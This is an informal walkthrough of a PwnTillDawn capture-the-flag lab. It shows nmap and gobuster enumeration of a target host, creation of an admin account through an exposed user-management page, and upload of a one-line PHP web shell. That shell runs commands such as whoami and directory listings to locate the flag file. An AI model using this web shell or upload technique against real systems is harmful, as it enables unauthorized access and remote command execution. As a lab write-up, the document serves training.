# Pwntilldawn-Lab3
1. Looking for ip
   `nmap -sn 10.150.150.0/24` 
   (Picture)
   
   or even better do this `nmap -p 80,21,22,445 10.150.150.0/24`)<br/>
Note this for:<br/>
  This tells Nmap to ONLY scan specific ports instead of all ports: <br/>
80 → HTTP (web server)
21 → FTP (file transfer)
22 → SSH (remote login)
445 → SMB (Windows file sharing)
(Picture here)

Doing 10.150.150.11 <br/>
Has 
| Service  |  State 
| ------------- | ------------- |
| ftp | Close  | 
| ssh  | Close  |
| http  | Close  |
| microsoft-ds  | Close  | <br/>

 2.`gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak`
 (Picture here)
 (Picture here)

Has several HTTP links we can try to access<br>

 3. i. /Admin
    (Admin Picture)

   ii. /upload
   (Upload Picture)

4. Inside http://10.150.150.11, there's a decent directory to get into, which is the addedituser.php
   Create a user with an admin role

  Extra: Access to admin account using simple tricks (Inspect Q). change type=password into type=text
  (Picture)

5. Create a simple webshell to run commands through the browser.
   `<?php system($_GET['cmd']); ?>` save it as "shell.php"
   Afterward, upload it into your accounts.
   (Picture)

7. Force uploading the files into the new folder of http://10.150.150.11/upload/12
   Reason to run the PHP file on the web.
   http://10.150.150.11/upload/12/shell.php
   http://10.150.150.11/upload/12/shell.php?cmd=hostname
   (Picture)
   
   http://10.150.150.11/upload/12/shell.php?cmd=whoami
   (Picture)

# Because we know it's a window
  http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users
   (Picture)

   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop
   (Picture)

   There it is. The flag file
   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop\FLAG1.txt
   (Picture)

 
 
